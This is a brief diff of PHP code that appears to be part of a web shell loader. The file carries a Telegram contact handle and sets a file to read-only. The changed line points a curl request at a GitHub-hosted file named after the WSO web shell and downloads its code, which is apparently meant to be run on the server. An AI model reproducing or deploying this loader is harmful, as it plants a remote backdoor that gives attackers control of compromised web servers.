@@ -10,7 +10,7 @@ chmod($file, 0444);
 
 <?php
 #telegram @Devidluice
-$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rere/main/wso-wholecode.php";
+$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rere/main/wso-wholecode.txt";
 $ch = curl_init($remoteUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $remoteCode = curl_exec($ch);
